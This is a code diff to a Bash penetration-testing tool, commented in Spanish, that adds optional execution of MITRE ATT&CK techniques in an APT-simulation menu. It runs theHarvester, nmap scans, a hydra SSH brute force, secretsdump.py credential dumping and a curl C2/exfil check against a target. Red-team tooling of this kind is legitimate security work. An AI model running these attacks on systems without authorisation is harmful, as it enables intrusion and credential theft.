@@ -2960,6 +2960,93 @@ _show_apt() {
             echo -e "$rest" | sed 's/^/      /'
         fi
         echo ""
+
+        # Ejecución real opcional por técnica
+        local tid_paso="${tecnica%% -*}"
+        tid_paso="${tid_paso// /}"
+        read -p "  ⚡ ¿Ejecutar técnica ${CYAN}$tid_paso${NC} contra ${TARGET}? (s/N): " exec_paso
+        if [[ "${exec_paso,,}" == "s" ]]; then
+            if confirm_risk "APT Simulation — $tid_paso" "ALTO" "$TARGET"; then
+                local apt_output=""
+                case "$tid_paso" in
+                    T1566*|T1598*)
+                        # Phishing/Recon → theHarvester para recopilar emails
+                        if check_command theHarvester; then
+                            echo -e "${CYAN}▶ Recon de emails (T1566 prep): theHarvester -d $TARGET -b google,bing${NC}"
+                            apt_output=$(anon_exec "theHarvester -d '$TARGET' -b google,bing" 2>&1)
+                            echo "$apt_output"
+                            save_output "[APT $apt $tid_paso theHarvester $TARGET]\n$apt_output"
+                            type track_technique &>/dev/null && track_technique "$tid_paso" "APT Simulation Phishing Recon"
+                        fi
+                        ;;
+                    T1046*|T1595*|T1590*)
+                        # Network scanning
+                        if check_command nmap; then
+                            echo -e "${CYAN}▶ Network scan (${tid_paso}): nmap -sV -T2 $TARGET${NC}"
+                            apt_output=$(anon_exec "nmap -sV -T2 '$TARGET'" 2>&1)
+                            echo "$apt_output"
+                            save_output "[APT $apt $tid_paso nmap $TARGET]\n$apt_output"
+                            type track_technique &>/dev/null && track_technique "$tid_paso" "APT Simulation Network Scan"
+                        fi
+                        ;;
+                    T1021*)
+                        # Lateral movement → check puerto RDP/SSH
+                        if check_command nmap; then
+                            echo -e "${CYAN}▶ Port scan lateral movement (${tid_paso}): nmap -p 22,3389,445,5985 $TARGET${NC}"
+                            apt_output=$(anon_exec "nmap -p 22,3389,445,5985 '$TARGET'" 2>&1)
+                            echo "$apt_output"
+                            save_output "[APT $apt $tid_paso nmap-lateral $TARGET]\n$apt_output"
+                            type track_technique &>/dev/null && track_technique "$tid_paso" "APT Simulation Lateral Movement"
+                        fi
+                        ;;
+                    T1078*|T1110*)
+                        # Valid accounts / brute force
+                        if check_command hydra; then
+                            read -p "  👤 Usuario a testear [admin]: " apt_user
+                            apt_user="${apt_user:-admin}"
+                            read -p "  📋 Wordlist [/usr/share/wordlists/rockyou.txt]: " apt_wl
+                            apt_wl="${apt_wl:-/usr/share/wordlists/rockyou.txt}"
+                            echo -e "${CYAN}▶ Brute force (${tid_paso}): hydra -l $apt_user -P $apt_wl ssh://$TARGET${NC}"
+                            apt_output=$(anon_exec "hydra -l '$apt_user' -P '$apt_wl' ssh://'$TARGET' -t 4" 2>&1)
+                            echo "$apt_output"
+                            save_output "[APT $apt $tid_paso hydra $TARGET]\n$apt_output"
+                            type track_technique &>/dev/null && track_technique "$tid_paso" "APT Simulation Credential Access"
+                        fi
+                        ;;
+                    T1003*|T1552*)
+                        # Credential dumping → secretsdump
+                        if check_command secretsdump.py; then
+                            read -p "  👤 Usuario: " apt_user
+                            read -p "  🔑 Password: " apt_pass
+                            echo -e "${CYAN}▶ Credential dump (${tid_paso}): secretsdump.py $apt_user@$TARGET${NC}"
+                            apt_output=$(secretsdump.py "$apt_user:$apt_pass@$TARGET" 2>&1)
+                            echo "$apt_output"
+                            save_output "[APT $apt $tid_paso secretsdump $TARGET]\n$apt_output"
+                            type track_technique &>/dev/null && track_technique "$tid_paso" "APT Simulation Credential Dump"
+                        fi
+                        ;;
+                    T1041*|T1071*)
+                        # Exfil/C2 → test conectividad HTTP
+                        if check_command curl; then
+                            echo -e "${CYAN}▶ C2/Exfil connectivity test (${tid_paso}): curl -I $TARGET${NC}"
+                            apt_output=$(anon_exec "curl -I '$TARGET'" 2>&1)
+                            echo "$apt_output"
+                            save_output "[APT $apt $tid_paso curl-c2 $TARGET]\n$apt_output"
+                            type track_technique &>/dev/null && track_technique "$tid_paso" "APT Simulation C2 Exfil"
+                        fi
+                        ;;
+                    T1059*|T1027*|T1053*|T1055*|T1070*)
+                        # Técnicas que requieren acceso previo — informar
+                        echo -e "${YELLOW}⚠️  $tid_paso requiere acceso previo al sistema objetivo.${NC}"
+                        echo -e "${YELLOW}   Usá Post-Explotación (menú 11) una vez que tengas sesión activa.${NC}"
+                        type track_technique &>/dev/null && track_technique "$tid_paso" "APT Simulation (requires prior access)"
+                        ;;
+                    *)
+                        echo -e "${YELLOW}⚠️  No hay ejecución automatizada para $tid_paso — revisar manualmente.${NC}"
+                        ;;
+                esac
+            fi
+        fi
     done
     echo -e "${CYAN}══ TÉCNICAS MITRE ATT&CK ════════════════════════${NC}"
     IFS='|' read -ra tecs <<< "$tecnicas"
